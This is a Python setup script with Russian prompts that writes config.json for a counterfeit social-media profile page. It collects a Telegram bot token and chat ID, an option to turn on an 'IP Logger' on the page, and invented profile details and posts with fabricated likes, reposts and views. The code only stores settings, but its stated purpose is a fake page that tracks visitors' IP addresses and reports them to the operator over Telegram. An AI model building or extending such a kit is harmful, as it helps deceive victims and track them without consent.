import json


data = {}



ip_logger = input('[Y/N] Включить IP Логгер на дефолтной странице? ')
token = input('Токен телеграм бота: ')
chat_id = input('Чат айди вашего телеграм аккаунта: ')
avatar = input('Ссылка на аватарку аккаунта: ')
name = input('Имя аккаунта: ')
city = input('Город аккаунта: ')
followers = input('Количество подписчиков: ')
online_time = input('Онлайн время (Пример: заходил 34 минуты назад): ')
posts_num = input('Количество записей: ')
posts = input('Количество постов на фейк странице: ')

if ip_logger in ['No', 'N', 'Нет', 'no', 'нет', 'н', 'Н']:
    data['ip_logger'] = False
elif ip_logger in ['Yes', 'Y', 'Да', 'yes', 'да', 'д', 'Д']:
    data['ip_logger'] = True

data['token'] = token
data['chat_id'] = chat_id
data['avatar'] = avatar
data['name'] = name
data['city'] = city
data['followers'] = followers
data['online_time'] = online_time
data['posts_num'] = posts_num


post_list = []

for i in range(0, int(posts)):
    print(f'Заполните данные поста №{i + 1}:')
    date = input('Дата публицации поста (Пример: 23 мар в 15:53): ')
    title = input('Текст над постом: ')
    image_link = input('Ссылка на фото поста: ')
    likes = input('Количество лайков (Пример: 11K): ')
    reposts = input('Количество репостов (Пример: 356): ')
    views = input('Количество просмотров (Пример: 100K): ')
    post_data = {}
    post_data['date'] = date
    post_data['title'] = title
    post_data['image_link'] = image_link
    post_data['likes'] = likes
    post_data['reposts'] = reposts
    post_data['views'] = views
    post_list.append(post_data)
    
data['posts'] = post_list

data = json.dumps(data, ensure_ascii=False)

with open('config.json', 'w', encoding='utf-8') as f:
    f.write(data)